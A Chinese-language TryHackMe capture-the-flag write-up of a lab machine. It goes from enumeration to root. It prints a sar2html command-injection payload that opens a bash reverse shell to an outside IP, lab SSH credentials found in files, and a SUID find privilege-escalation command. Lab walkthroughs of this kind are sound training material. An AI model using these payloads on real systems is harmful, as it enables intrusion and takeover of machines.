# THM Vulnerable Machine - 渗透测试 Writeup

## 目标信息
- **IP**: 10.48.157.113
- **平台**: TryHackMe (THM)
- **类型**: Vulnerable Machine
- **日期**: 2026-05-21
- **授权**: THM 授权靶场，全 IP 范围，无限制

## 攻击链总结

### 1. 信息收集
- **端口扫描**: 21/80/10000/55007 开放
- **服务识别**: FTP(vsftpd 3.0.3), Apache 2.4.18, Webmin 1.930, SSH(OpenSSH 7.2p2)
- **目录扫描**: gobuster 发现 Joomla CMS + 非标准目录

### 2. FTP 匿名枚举
- **发现文件**: `.info.txt` (74 bytes)
- **内容**: ROT13 编码的提示信息
- **解码后**: "Just wanted to see if you find it. Lol. Remember: Enumeration is the key!"

### 3. Webmin 漏洞探测
- **版本**: 1.930
- **CVE-2019-15107 测试**: 失败
- **原因**: `Password changing is not enabled!`

### 4. Web 枚举
- **Joomla**: `/joomla` - 目标运行 Joomla CMS
- **robots.txt**: ASCII 十进制编码 → Base64 → MD5 → `kiding` (提示信息)
- **非标准目录**: `_database`, `_archive`, `_files`, `_test`

### 5. 非标准目录检查
- **`_database/`**: "Woops" 页面
- **`_archive/`**: "Mnope, nothin to see."
- **`_files/`**: Base64 解码: `Whopsie daisy` (提示信息)
- **`_test/`**: **sar2html 应用** - 已知 CVE-2019-9673 命令注入漏洞
- **`installation/`**: Joomla 安装向导 - 未删除

### 6. sar2html 命令注入
- **漏洞**: CVE-2019-9673 - sar2html `plot` 参数命令注入
- **Payload**: `?plot=;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.241.203/5555+0>%261'`
- **获取用户**: www-data

### 7. 凭据发现
- **来源**: `/var/www/html/joomla/_test/log.txt`
- **用户名**: basterd
- **密码**: superduperp@$$
- **服务**: SSH (端口 55007)

### 8. SSH 登录
- **用户**: basterd
- **密码**: superduperp@$$
- **主机**: 10.48.157.113

### 9. 横向移动
- **发现文件**: `/home/basterd/backup.sh`
- **内容**: stoner 用户备份脚本
- **凭据泄露**: `#superduperp@$$no1knows`
- **用户名**: stoner
- **密码**: superduperp@$$no1knows

### 10. stoner 用户枚举
- **.secret 文件**: "You made it till here, well done." (user.txt)
- **.nano 目录**: 空

### 11. 权限提升
- **sudo 权限**: `/NotThisTime/MessinWithYa` (NOPASSWD)
- **SUID 文件**: `/usr/bin/find` (root 拥有)
- **提权方法**: `/usr/bin/find . -exec /bin/bash -p \;`
- **获取用户**: root

### 12. Flag 获取
- **user.txt**: `/home/stoner/.secret` - "You made it till here, well done."
- **root.txt**: `/root/root.txt` - "It wasn't that hard, was it?"

## 获取的 Flags

| Flag         | 位置                   | 内容                                |
| ------------ | ---------------------- | ----------------------------------- |
| **user.txt** | `/home/stoner/.secret` | "You made it till here, well done." |
| **root.txt** | `/root/root.txt`       | "It wasn't that hard, was it?"      |

## 关键技术点

### 1. 信息隐藏
- FTP `.info.txt` 使用 ROT13 编码
- robots.txt 使用 ASCII 十进制 → Base64 → MD5 多层编码
- 非标准目录使用提示语误导攻击者

### 2. sar2html 命令注入
- CVE-2019-9673 - `plot` 参数可执行任意命令
- 通过命令注入获取反向 shell

### 3. 凭据泄露链
- log.txt 泄露 SSH 凭据 (basterd)
- backup.sh 泄露另一个用户凭据 (stoner)
- 密码模式相似: `superduperp@$$` → `superduperp@$$no1knows`

### 4. SUID 提权
- `/usr/bin/find` 为 root 拥有的 SUID 文件
- `find . -exec /bin/bash -p \;` 可获取 root shell
- 需要 `-p` 参数保留权限

## 工具使用

| 工具     | 用途            |
| -------- | --------------- |
| nmap     | 端口扫描        |
| gobuster | 目录扫描        |
| curl     | HTTP 请求       |
| nc       | 反向 shell 监听 |
| base64   | 编码解码        |
| hashcat  | MD5 破解        |
